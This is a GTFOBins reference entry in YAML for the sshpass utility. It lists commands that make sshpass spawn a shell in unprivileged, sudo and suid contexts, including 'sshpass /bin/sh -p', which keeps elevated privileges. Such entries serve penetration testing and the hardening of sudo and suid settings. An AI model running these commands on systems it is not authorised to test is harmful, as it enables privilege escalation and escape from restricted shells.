<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/sshpass -->
---
functions:
  shell:
  - code: |-
      sshpass /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          sshpass /bin/sh -p
        shell: false
      unprivileged:
...
